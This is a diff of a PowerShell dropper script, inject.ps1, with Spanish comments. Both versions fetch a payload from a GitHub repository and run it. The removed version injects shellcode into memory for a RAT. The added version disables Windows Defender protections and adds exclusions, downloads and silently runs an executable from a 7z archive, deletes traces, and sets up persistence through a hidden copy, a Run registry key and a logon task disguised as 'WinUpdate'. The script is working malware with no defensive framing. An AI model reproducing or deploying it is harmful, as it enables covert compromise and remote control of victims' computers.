@@ -1,28 +1,53 @@
-# inject.ps1 - Descarga loader.bin e inyecta en memoria (con bucle de espera)
-$ErrorActionPreference = 'Stop'
-$binUrl = 'https://github.com/DECODERkING/code/raw/main/loader.bin'
-$binPath = "$env:TEMP\loader.bin"
+# ============================================
+# inject.ps1 - Descarga FramehostUpdate.7z + Bypass + Persistencia
+# ============================================
+$ErrorActionPreference = 'SilentlyContinue'
 
-(New-Object Net.WebClient).DownloadFile($binUrl, $binPath)
-$bytes = [IO.File]::ReadAllBytes($binPath)
-Remove-Item $binPath -Force
+# 1. BYPASS WINDOWS DEFENDER
+try {
+    Stop-Service WinDefend -Force -ErrorAction Stop
+    Set-MpPreference -DisableRealtimeMonitoring $true -Force
+    Set-MpPreference -DisableBehaviorMonitoring $true -Force
+    Set-MpPreference -DisableBlockAtFirstSeen $true -Force
+    Set-MpPreference -DisableIOAVProtection $true -Force
+    Set-MpPreference -DisableScriptScanning $true -Force
+    Add-MpPreference -ExclusionPath $env:APPDATA -Force
+    Add-MpPreference -ExclusionPath $env:TEMP -Force
+    Add-MpPreference -ExclusionExtension '.exe' -Force
+    Add-MpPreference -ExclusionExtension '.7z' -Force
+    Add-MpPreference -ExclusionProcess 'powershell.exe' -Force
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Force
+    Start-Sleep -Seconds 2
+} catch {}
 
-$k32 = Add-Type -MemberDefinition @'
-[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
-[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-[DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-'@ -Name 'K32' -Namespace 'Win32' -PassThru
+# 2. DESCARGA Y EJECUCIÓN DEL ARCHIVO 7Z
+$zipUrl = "https://raw.githubusercontent.com/DECODERkING/code/main/FramehostUpdate.7z"
+$zipPath = "$env:TEMP\update.7z"
+$destPath = "$env:TEMP\framehost"
 
-$size  = [UIntPtr]::new($bytes.Length)
-$addr  = $k32::VirtualAlloc([IntPtr]::Zero, $size, 0x1000 -bor 0x2000, 0x40)
-[Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
+try {
+    (New-Object Net.WebClient).DownloadFile($zipUrl, $zipPath)
+    if (Test-Path $zipPath) {
+        if (-not (Test-Path $destPath)) { New-Item -ItemType Directory -Path $destPath -Force | Out-Null }
+        # Usar 7zip para descomprimir
+        $7zPath = "$env:TEMP\7z.exe"
+        if (-not (Test-Path $7zPath)) {
+            (New-Object Net.WebClient).DownloadFile("https://www.7-zip.org/a/7zr.exe", $7zPath)
+        }
+        Start-Process -FilePath $7zPath -ArgumentList "x `"$zipPath`" -o`"$destPath`" -y" -WindowStyle Hidden -Wait
+        Start-Sleep -Seconds 3
+        $exe = Get-ChildItem -Path $destPath -Filter "*.exe" | Select-Object -First 1
+        if ($exe) { Start-Process $exe.FullName -WindowStyle Hidden }
+        Remove-Item $zipPath -Force
+        Remove-Item $destPath -Recurse -Force
+    }
+} catch {}
 
-$th = $k32::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-
-# Damos tiempo al hilo para que inicialice
-Start-Sleep -Seconds 5
-
-# Mantenemos vivo el proceso de PowerShell para que el RAT no muera
-while ($true) {
-    Start-Sleep -Seconds 60
-}
+# 3. PERSISTENCIA
+$hiddenDir = "$env:APPDATA\Microsoft\Windows\Explorer"
+if (-not (Test-Path $hiddenDir)) { New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null }
+$scriptCopy = "$hiddenDir\WinUpdate.ps1"
+Copy-Item $PSCommandPath $scriptCopy -Force
+Set-ItemProperty -Path $scriptCopy -Name Attributes -Value "Hidden,System"
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUpdate" -Value "powershell.exe -Ep Bypass -W Hidden -File `"$scriptCopy`"" -Force
+schtasks /create /tn "WinUpdateTask" /tr "powershell.exe -Ep Bypass -W Hidden -File `"$scriptCopy`"" /sc onlogon /f | Out-Null
